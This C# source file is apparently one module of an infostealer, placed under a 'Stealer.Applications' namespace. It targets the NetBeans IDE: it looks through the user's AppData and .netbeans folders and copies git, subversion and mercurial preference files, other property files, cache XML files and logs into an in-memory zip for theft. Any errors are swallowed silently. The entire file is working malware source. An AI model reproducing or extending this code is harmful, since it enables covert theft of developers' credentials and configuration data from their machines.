using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class NetBeans : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NetBeans");
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".netbeans");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "NetBeans";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(userProfilePath))
            {
                foundData |= CollectFromDirectory(userProfilePath, "UserProfile", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] versionDirs = Directory.GetDirectories(basePath, "*", SearchOption.TopDirectoryOnly);

                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);
                    
                    string configPath = Path.Combine(versionDir, "config");
                    if (Directory.Exists(configPath))
                    {
                        string[] configFiles = new string[]
                        {
                            "Preferences\\org\\netbeans\\modules\\git.properties",
                            "Preferences\\org\\netbeans\\modules\\subversion.properties",
                            "Preferences\\org\\netbeans\\modules\\mercurial.properties"
                        };

                        foreach (string configFile in configFiles)
                        {
                            string fullPath = Path.Combine(configPath, configFile);
                            if (File.Exists(fullPath))
                            {
                                string zipPath = $"Applications\\NetBeans\\{location}\\{versionName}\\{configFile.Replace("\\", "/")}";
                                zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                                counterApplications.Files.Add(fullPath + " => " + zipPath);
                                foundData = true;
                            }
                        }

                        string preferencesPath = Path.Combine(configPath, "Preferences");
                        if (Directory.Exists(preferencesPath))
                        {
                            string[] propFiles = Directory.GetFiles(preferencesPath, "*.properties", SearchOption.AllDirectories);
                            
                            foreach (string file in propFiles.Take(20))
                            {
                                string relativePath = file.Substring(configPath.Length + 1);
                                string zipPath = $"Applications\\NetBeans\\{location}\\{versionName}\\{relativePath.Replace("\\", "/")}";
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }

                    string varPath = Path.Combine(versionDir, "var");
                    if (Directory.Exists(varPath))
                    {
                        string cachePath = Path.Combine(varPath, "cache");
                        if (Directory.Exists(cachePath))
                        {
                            string[] cacheFiles = Directory.GetFiles(cachePath, "*.xml", SearchOption.TopDirectoryOnly);
                            
                            foreach (string file in cacheFiles)
                            {
                                string fileName = Path.GetFileName(file);
                                string zipPath = $"Applications\\NetBeans\\{location}\\{versionName}\\cache\\{fileName}";
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }

                        string logPath = Path.Combine(varPath, "log");
                        if (Directory.Exists(logPath))
                        {
                            string[] logFiles = Directory.GetFiles(logPath, "*.log", SearchOption.TopDirectoryOnly);
                            
                            foreach (string file in logFiles.Take(3))
                            {
                                string fileName = Path.GetFileName(file);
                                string zipPath = $"Applications\\NetBeans\\{location}\\{versionName}\\log\\{fileName}";
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
